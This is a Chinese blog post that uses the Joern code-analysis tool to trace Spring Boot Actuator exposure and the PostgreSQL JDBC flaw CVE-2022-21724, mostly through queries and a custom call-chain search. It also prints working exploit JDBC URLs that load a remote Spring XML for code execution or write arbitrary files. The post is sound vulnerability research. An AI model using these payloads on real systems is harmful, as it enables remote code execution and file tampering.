---
title: Joern In RealWorld (1) - Acutators + CVE-2022-21724
date: 2023-08-31 17:06:53
tags:
- joern
- sast
- java
---

这个系列会记录我用Joern复现真实漏洞的一些过程，同样也是对Joern的深入探索。

这里我选用**Java-sec-code的范例代码**做第一部分，这篇文章记录了两个比较经典的漏洞

- **Springboot Acutators导致命令执行**
- **postgreSQL jdbc反序列化漏洞(CVE-2022-21724)**

Joern分析Java代码可以选择用代码文件夹也可以选择直接分析jar包

```cypher
importCode("../../java-sec-code/target/java-sec-code-1.0.0.jar")
```

<!--more-->

# Springboot Acutators配置问题

- https://github.com/JoyChou93/java-sec-code/wiki/Actuators-to-RCE#reference
- [https://github.com/LandGrey/SpringBootVulExploit#0x01%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F](https://github.com/LandGrey/SpringBootVulExploit#0x01路由地址及接口调用详情泄漏)
- https://www.veracode.com/blog/research/exploiting-spring-boot-actuators

**SpringBoot Actuator是SpringBoot内置的一个监控管理插件。**只要引用组件就会开启对应的功能

```cypher
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-actuator</artifactId>
</dependency>
```

开启后**SpringBoot 1.x起始路径为**`/`**，2.x的起始路径为**`/actuator`

暴露路由本身不能算太大的安全问题，只能说**配置不当可能导致信息泄露**，可以参[spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)。

Actuator的接口配合一些组件就可能导致RCE，但防御的方法大多都是**对Actuator做鉴权限制**。

- **Actuators + jolokia**

```cypher
        <!-- SpringBoot Actuator命令执行的库 -->
        <dependency>
            <groupId>org.jolokia</groupId>
            <artifactId>jolokia-core</artifactId>
            <version>1.6.0</version>
        </dependency>
```

配合jolokia的接口可以实现jndi注入导致RCE

- **Actuators + Spring Cloud**
- https://www.freebuf.com/column/234719.html

```cypher
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>
            <version>1.4.0.RELEASE</version>
        </dependency>
```

首先组件上引用eureka才行，并且**Eureka-Client <1.8.7**（多见于Spring Cloud Netflix）

其次需要Application要有`@EnableEurekaClient`注解

```cypher
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.cloud.netflix.eureka.EnableEurekaClient;

@SpringBootApplication
@EnableEurekaClient
public class Application {
    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }
}
```

## for Joern

我首先遇到的问题就是，这个漏洞其实**配置问题大于其他问题**，我研究了很久认为这个问题在Joern中是不可解的。

一方面Acutators开启只需要组件引用即可，另一方面比较常见的修复手段是增加鉴权，**加入鉴权组件并开启配置**

```cypher
# pom.xml
<dependency>
	<groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>

# for application.properties
management.security.enabled=true
security.user.name=admin
security.user.password=admin
```

哪怕不是用这个鉴权组件但也大同小异，关闭敏感端点之类的。

而问题回到Joern上，Joern虽然定义了ConfigFile节点，但**并没有读取所有的配置文件**，包括pom.xml。或者说pom.xml在Joern眼中不算是个配置文件。

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311722503.png)

即便是读取了**application.properties**这个文件，但ConfigFile节点只有文件内容，并没有**对所有的配置做分析转化**。而且有时候configFile就是完全空的，也不知道问题在哪。

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311722781.png)

这个处理方式虽然很奇怪但也算能理解，**Joern作为一个静态分析代码的框架**，他的理念就是把上层和下层做拆分，**下层只需要把代码转成CPG，上层只需要在CPG上做数据分析。**

对于Joern来说，上层和下层没有直通渠道，非代码层面的信息则会被忽略掉，而专注于代码层面，这是Joern的设计理念，但同样是Joern的局限性。

- 一方面由于**没有pom.xml的数据**，所以无法判断Acutators是否开启，且无法判断版本。
- 从SpringBoot 2.X开始，端点默认只暴露health和info，需要**从配置文件里获取开启的端点**，不一定能读到这个配置文件内容
- Acutators这个问题核心其实是不能**未授权+向公网暴露**，而这个鉴权配置也是从配置文件里读到的

```cypher
cpg.configFile.name(".*application.properties").where(_.content(".*management.security.enabled=false.*")).l
```

- **Acutators暴露的实际影响其实和依赖的组件**有关系，比如配合eureka才有xtream反序列漏洞，而没有依赖组件数据，所以也无从判断。

# postgreSQL jdbc反序列化漏洞(CVE-2022-21724)

- https://xz.aliyun.com/t/11812

```cypher
9.4.1208 <= org.postgresql.postgresql < 42.2.25
42.3.0 <= org.postgresql.postgresql < 42.3.2
```

当**PostgreSQL的jdbc url属性**可控时，可以通过`authenticationPluginClassName`、`sslhostnameverifier`、`socketFactory `、`sslfactory`、`sslpasswordcallback` 连接属性提供**类名实例化插件实例**。

- 漏洞代码

```cypher
  @RequestMapping("/postgresql")
  public void postgresql(String jdbcUrlBase64) throws Exception{
      byte[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);
      String jdbcUrl = new String(b);
      log.info(jdbcUrl);
      DriverManager.getConnection(jdbcUrl);
  }
```

其实漏洞点的Joern的公式特别简单，说白了就是**只要jdbc的连接链接可控**就行了。

```cypher
def source = cpg.method.where(_.annotation.name(".*Mapping")).parameter

def sink = cpg.call.name("getConnection")
```

直接寻找source和sink之间的数据流

```cypher
sink.reachableByFlows(source).p
```

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311722453.png)

可以发现我们找到了包括目标在内的5条数据流，这里的第一个问题是，我们没法确定**jdbc是否支持postgreSQL**来作为数据库。

在确定了**入口可控**之后，**理论上配合组件版本**其实我们就可以判断代码中是否存在该问题了，但我们并没有这个数据。

## for PostgreSQL code

当然在静态分析的层面，我们需要从代码的角度验证漏洞存在，我们遇到的第二个问题自然是**利用链的问题**，所以我们需要直接去**分析postgresql的组件代码**。

```cypher
importCode("D:/program/java_pro/postgresql-42.3.1.jar", "postgresql")
```

当我们可控jdbc的连接的时候，我们就可以通过**构造类似的请求来调用不同类的方法**来实现我们想要的结果。

```cypher
# 命令执行
jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://test.joychou.org/1.xml

# 配合FileOutputStream操作文件
jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=java.io.FileOutputStream&socketFactoryArg=test.txt

# sslfactory&sslfactroyarg，任意代码执行
jdbc:postgresql://127.0.0.1:5432/test/?sslfactory=org.spring.framework.context.support.ClassPathXmlApplicationContext&sslfactoryarg=http://test.joychou.org/1.xml

# loggerLevel&loggerFile，任意文件写
jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=debug&loggerFile=test.txt&test
```

这里具体的利用链我们就不重复讲了，可以直接参考上面的链接，重要的是**我们怎么在joern中复现这个问题。**

我们拿**第一个漏洞socketFactory&socketFactoryArg的利用链**作为目标来看看

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311722796.png)

从getConnection方法处，j**dbc会根据不同的请求分发至不同的组件**。

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311722079.png)

**从connect方法一路跟进org.postgresql的代码**当中，**链接之后的参数会被拆解为字典**然后分别进入不同的配置中，也就是说等于到url这里我们就是可控的，也就是作为source，**进到包里的这个入口是connect方法**

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311722400.png)

```cypher
def source = cpg.method.name("connect")
```

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311722952.png)最终**导致漏洞的核心点则是可控的newInstance**

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311722885.png)

所以我们假定**调用方法newInstance是sink点**，**可以用caller获取调用该方法的地方**，也是可以读到我们目标类方法的。

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723923.png)

```cypher
def sink = cpg.method.name("newInstance")
```

到这里我们会遇到一个比较大的问题，当我们**试图用简单的reachableByFlows时**，会无法获取到结果。

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723926.png)

但如果我们**手动去一步一步拆解caller，发现是可以一路跟到source节点的。**

```cypher
cpg.method.name("newInstance").repeat(_.caller)(_.maxDepth(10)).name("connect").fullName.dedup.l
```

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723832.png)

repeat这个语法问题相当多，**如果用repeat...until...这个语法，很大概率会卡死**，几乎跑realworld代码没有不卡死的，所以我改用了**限制maxDepth+条件判断的方式**来查询，还算可以解决。

当然这样只能拿到最终的节点，我们可以**用一个文档里没写的overflowdb语法enablePathTracking来展示调用链，这部分内容我是从@Lightless的博客偷来的。**

- https://lightless.me/archives/analyze-apache-commons-text-with-joern.html

```cypher
cpg.method.name("newInstance").enablePathTracking.repeat(_.caller)(_.maxDepth(10)).name("connect").path.map(path=>path.filter(n=>n.isInstanceOf[Method]).map(n=>{val nn = n.asInstanceOf[Method];nn.fullName})).dedup.l
```

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723885.png)

当然，**由于enablePathTracking的表现力很差，所以我们也可以用自己实现一套repeat，来解决重复调用等各种问题**，这个代码同样来自于@LightLess。

```cypher
def findUntil(initStep: Traversal[Method], stopStep: Traversal[Method], maxIdx: Int) : List[Vector[Method]] = {
    var nextBuffer: List[Vector[Method]] = List()
    var finalResult: List[Vector[Method]] = List()
    var results: List[Vector[Method]] = List()
    val stopList = stopStep.l
    val stopIdList = stopList.map(n => n.id).l
    println("stopList.size:" + stopList.size)
    println("stopIdList: " + stopIdList)

    for (idx <- 1 to maxIdx) {
        // 第一次查找，使用初始条件作为起始
        if (idx == 1) {
            for (it <- initStep) {
                finalResult = finalResult :+ Vector(it)
            }
        }

        // 处理 finalResult 中的每一条路径，取每条 path 的最后一项调用 caller
        for (eachPath <- finalResult) {
            
            var eachPathIdList = eachPath.filter(n => n.isInstanceOf[Method]).map(n => {
                n.asInstanceOf[Method].id
            }).l

            var newNodes = eachPath.last.asInstanceOf[Method].caller.dedup
            for (newNode <- newNodes) {
                // 检查 newPath 是否存在环，如果存在，则跳过，如果不存在，加到结果列表中
                if (!eachPathIdList.contains(newNode.id)) {
                    val newPath = eachPath :+ newNode
                    nextBuffer = nextBuffer :+ newPath

                    // 检查是否满足终结条件，如果满足，就加到resutls里
                    if (stopIdList.contains(newNode.id)) {
                        results = results :+ newPath
                    }
                }
            }
        }

        // 所有的路径都处理完了，结果放在 nextBuffer 中
        finalResult = nextBuffer
        nextBuffer = List()
    }
    return results
}
```

这个findUntil实现了**repeat...untail...times**的功能，而且也做了**一定的去重和优化**

```cypher
def sink = cpg.method.name("newInstance")
def source = cpg.method.name("connect")

findUntil(sink, source, 10).map(path => path.map(node => (node.fullName))).dedup.l
```

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723509.png)

虽然这里的函数调用链是正确的，但这里面有个很大的区别就是，**通过repeat获取的节点非常粗暴，并不一定是成数据流。**

拿下面这段代码举例子，**理论上来说数据流分析应该从ctor开始一点一点往上，一直找到classname参数，然后再到方法instantiate**，但如果直接**用caller会直接获取到instantiate方法，也就是直接到父节点**。

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723559.png)

但事实上**如果数据流追不到参数，实际上是数据流是不通的**，这种方式太粗暴，有效度也不会太高。连数据流分析的层面都到不了，更别谈过程间分析了。

最关键的是，仔细研究后感觉**这部分在joern中坑相当大，说白了就是Joern的CPG结构中其实没有这种执行流概念，节点之间链接只有AST指向，边的特性也没有明确的显示。**

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723540.png)

用比较通俗的话讲，就是**CPG更强调调用关系**，就比如**调用NewInstance方法的位置属于方法Instantiate的子节点**，而**具体到代码块执行流程，则只是简单的AST指向关系**，**除了有向边以外，也没有显示这种指向关系的特殊性。**

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723050.png)

这方面的问题需要再花时间研究一下，这篇文章先不深入去讲。后面专门写文章研究这部分。

## 其他利用链

我们仿照第一个利用链的语法，直接**模拟一下其他几个利用链的挖掘方式**

- **任意代码执行 sslfactory/sslfactoryarg**

```cypher
# sslfactory&sslfactroyarg，任意代码执行
jdbc:postgresql://127.0.0.1:5432/test/?sslfactory=org.spring.framework.context.support.ClassPathXmlApplicationContext&sslfactoryarg=http://test.joychou.org/1.xml
```

对应的利用链其实和上一个是一样的，**入口都是connect，漏洞点都是newinstance**，这条利用链用上面的代码就可以查询到

```cypher
def sink = cpg.method.name("newInstance")
def source = cpg.method.name("connect")

findUntil(sink, source, 10).map(path => path.map(node => (node.fullName))).dedup.l
```

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723267.png)

- **任意文件写入 loggerLevel/loggerFile**

```cypher
# loggerLevel&loggerFile，任意文件写
jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=debug&loggerFile=test.txt&test
```

这个漏洞的利用链相对特殊，其实是**利用了logger本身的功能**，通过**配置log写入的文件来实现任意文件写**

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723891.png)

这里**类初始化的操作在joern被标记为<init>**，所以sink为

```cypher
cpg.method.where(_.name("<init>")).where(_.fullName(".*FileHandler.*"))
```

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723607.png)

这样我们再次追利用链

```cypher
def sink = cpg.method.where(_.name("<init>")).where(_.fullName(".*FileHandler.*"))
def source = cpg.method.name("connect")

findUntil(sink, source, 10).map(path => path.map(node => (node.fullName))).dedup.l
```

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723710.png)

## 完善利用链

在**找到可控的****newInstance位置**之后，我们还需要继续完善利用链的最后一步。

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723065.png)

根据我们刚才找到的漏洞位置，我们需要找到**一个对应的构造方法参数为一个String的类**来做进一步利用。

在Joern中可以**通过寻找构造函数的关键字，再限制方法的返回类型来寻找这样的类**.

```cypher
cpg.method.where(_.isConstructor).whereNot(_.typeDecl.isAbstract).fullName(".*:void\\(java.lang.String\\).*").fullName.l
```

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723436.png)

当然这里找到的类是不全的，这里的问题和前面类似。**Joern不会解jar包里的jar包**，所以无法**跟进去分析整个项目的依赖**，自然也就没办法找到完整的利用点，这里不赘述了

## 修复

这个漏洞的修复也相当粗暴，在我们找到的最终执行命令的初始化任意类的地方，**新版本直接指定获取的类名必须是指定类的子类，直接限制了后续的利用条件**

![img](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202308311723278.png)
